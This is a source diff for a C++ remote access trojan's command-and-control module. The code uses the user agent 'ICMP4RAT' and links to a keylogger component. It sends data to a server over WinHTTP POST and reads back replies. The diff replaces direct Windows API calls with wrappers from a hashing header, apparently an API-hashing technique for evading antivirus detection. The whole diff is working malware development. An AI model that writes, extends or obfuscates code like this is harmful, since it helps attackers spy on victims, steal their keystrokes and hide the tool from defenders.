@@ -1,3 +1,4 @@
+#pragma once
 #include <stdlib.h>
 #include <iostream>
 #include <string>
@@ -12,6 +13,7 @@
 #include "commandManager.h"
 #include "keyLogger.h"
 #include "util.h"
+#include "HashFunction_cnc.h"
 
 cncManager::cncManager() {
 }
@@ -33,25 +35,25 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen, DWORD buf_size) {
         hRequest = NULL;
 
     BOOL bResults = FALSE;
-     hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC);
+     hSession = WinHttpOpen_c(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC);
 
     if (hSession)
-         hConnect = WinHttpConnect(hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);
+         hConnect = WinHttpConnect_c(hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);
 
     if (hConnect)
-         hRequest = WinHttpOpenRequest(hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+         hRequest = WinHttpOpenRequest_c(hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
     DWORD dwSize = 0;
     DWORD dwDownloaded = 0;
 
     if (hRequest)
-        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);
+        bResults = WinHttpSendRequest_c(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);
 
     if (bResults)
-        bResults = WinHttpReceiveResponse(hRequest, NULL);
+        bResults = WinHttpReceiveResponse_c(hRequest, NULL);
 
     if (!bResults)
-        std::cout << "Error" << GetLastError() << "has occurred." << std::endl;
+        std::cout << "Error" << GetLastError_c() << "has occurred." << std::endl;
 
     if (bResults)
     {
@@ -62,9 +64,9 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen, DWORD buf_size) {
                 dwSize = buf_size;
 
             else {
-                if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+                if (!WinHttpQueryDataAvailable_c(hRequest, &dwSize))
                 {
-                    printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
+                    printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError_c());
                     break;
                 }
             }
@@ -82,8 +84,8 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen, DWORD buf_size) {
             }
             // Read the Data.
             ZeroMemory(pszOutBuffer, dwSize + 1);
-            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
-                printf("Error %u in WinHttpReadData.\n", GetLastError());
+            if (!WinHttpReadData_c(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
+                printf("Error %u in WinHttpReadData.\n", GetLastError_c());
 
             else
             {
@@ -98,9 +100,9 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen, DWORD buf_size) {
         } while (dwSize > 0);
     }
 
-    if (hRequest) WinHttpCloseHandle(hRequest);
-    if (hConnect) WinHttpCloseHandle(hConnect);
-    if (hSession) WinHttpCloseHandle(hSession);
+    if (hRequest) WinHttpCloseHandle_c(hRequest);
+    if (hConnect) WinHttpCloseHandle_c(hConnect);
+    if (hSession) WinHttpCloseHandle_c(hSession);
     
 
 }   
